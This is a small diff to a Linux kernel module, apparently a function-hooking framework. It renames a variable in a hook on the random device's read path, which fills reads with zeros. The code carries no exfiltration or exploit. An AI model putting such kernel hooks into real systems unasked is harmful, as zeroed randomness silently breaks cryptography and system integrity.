@@ -234,7 +234,7 @@ static void hook_do_exit(long code)
 
 static ssize_t hook_random_read_iter(struct kiocb *kiocb, struct iov_iter *iter)
 {
-    int err;
+    int ret;
     size_t len = iov_iter_count(iter);
     char *kernel_buf = kzalloc(len, GFP_KERNEL);
     if (kernel_buf == NULL) {
@@ -242,9 +242,9 @@ static ssize_t hook_random_read_iter(struct kiocb *kiocb, struct iov_iter *iter)
         return -ENOMEM;
     }
 
-    err = copy_to_iter(kernel_buf, len, iter);
-    if (!err) {
-        ROOTI_DEBUG("copy_to_iter() failed: %d", err);
+    ret = copy_to_iter(kernel_buf, len, iter);
+    if (ret == 0) {
+        ROOTI_DEBUG("copy_to_iter() failed: %d", ret);
         kfree(kernel_buf);
         return -EFAULT;
     }
